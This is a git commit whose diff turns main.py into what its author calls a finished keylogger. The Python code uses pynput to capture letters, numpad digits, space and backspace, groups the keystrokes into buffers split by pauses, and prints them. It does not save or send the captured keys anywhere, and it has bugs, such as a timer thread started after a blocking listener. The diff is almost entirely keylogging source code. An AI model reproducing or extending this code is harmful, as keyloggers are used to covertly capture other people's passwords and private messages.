750c9093b8f79bc5b1f505d4b028e9724789fd79
Jimi <leszcz110@gmail.com>
2026-08-11 20:10:22 +0200

    Finished keylogger that handles letters, numbers, space, backspace. Added libraries: time and threading.

--- main.py
+++ main.py
@@ -1,12 +1,49 @@
 from pynput import keyboard
+import time, threading
+
+kelogger_data = []
+current_data_pos = 0
+has_been_pressed = False
+wait_time = 3
 
 def on_press(key):
-    print(repr(key))
+    global has_been_pressed, kelogger_data
     try:
-        if key.char == 'a':
-            print("Naciśnięto A")
+        if key.vk in range(96,106):
+            # numpad numbers 0-9
+            formated = str(int(key.vk) - 96)
+        else:
+            # normal characters
+            formated = key.char
     except AttributeError:
-        pass
+        # special keys
+        if key == keyboard.Key.space:
+            # space
+            formated = " "
+        elif key == keyboard.Key.backspace:
+            # backspace
+            formated = "^BSpace^"
+        else:
+            # others
+            return
 
+    if len(kelogger_data) > current_data_pos:
+        kelogger_data[current_data_pos] += formated
+    else:
+        kelogger_data.append(formated)
+
+    has_been_pressed = True
+    print(kelogger_data)
+
+def change_current():
+    global current_data_pos, has_been_pressed, kelogger_data
+    if has_been_pressed == False and len(kelogger_data) > current_data_pos:
+        current_data_pos += 1
+    has_been_pressed = False
+    time.sleep(wait_time)
+    change_current()
+
+# keylogger start
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
+threading.Thread(target=change_current, daemon=True).start()
